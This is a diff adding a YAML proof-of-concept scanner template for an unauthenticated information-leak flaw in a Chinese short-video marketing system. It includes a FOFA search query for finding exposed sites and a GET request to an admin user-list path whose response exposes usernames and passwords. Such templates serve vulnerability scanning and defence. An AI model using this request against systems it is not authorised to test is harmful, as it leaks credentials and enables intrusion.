@@ -1,0 +1,15 @@
+id: poc-yaml-short-video-matrix-user-leak-info
+info:
+  name: 短视频矩阵营销系统 admin/user 信息泄露漏洞
+  severity: medium
+  tags:
+  - 文件读取
+  finger: 短视频矩阵营销系统
+  fofa: title="短视频矩阵营销系统"
+requests:
+- method: GET
+  path: /index.php/admin/user/index.html?page=1
+  expression: "status_code == 200 && \ncontains(find_json(body,\"0.password\"), \"\
+    \") &&\ncontains(find_json(body,\"0.username\"), \"\")\n"
+variables: {}
+transport: http
